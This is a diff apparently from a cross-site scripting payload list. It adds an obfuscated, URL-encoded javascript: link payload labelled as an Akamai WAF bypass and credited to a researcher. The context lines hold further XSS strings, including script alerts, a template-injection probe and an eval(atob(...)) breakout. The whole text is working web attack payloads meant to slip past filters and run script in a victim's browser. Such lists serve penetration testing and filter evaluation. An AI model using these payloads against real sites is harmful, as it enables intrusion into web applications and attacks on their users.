@@ -64,4 +64,7 @@
     '&NewLine;<script&#9;type="text/javascript">alert(`XSS`)</script>{{85*85}}JyI+PGgxPmhhdHRhY2tpcmk8L2gxPg',
     '"));eval(atob(`YWxlcnQoMSk=`))//'
 
+## Akamaidra!!
+%22%3E%3Ch1%3EAkiraq%3C%2Fh1%3E%3ca%2fhref%3d%22j%0A%0Davascript%3a%7bvar%7b3%3as,2%3ah,5%3aa,0%3av,4%3an,1%3ae%7d%3d'earltv'%7d[self][0][v%2ba%2be%2bs](e%2bs%2bv%2bh%2bn)(%2finfected%2f%2esource)%22%20%2f%3eclick%20(workin)Pinaki%20@0xInfection%20(Make%20sure%20the%20applications%20decodes%20the%20payload%20from%20encoded)
 
+Thanks: Pinaki%20@0xInfection
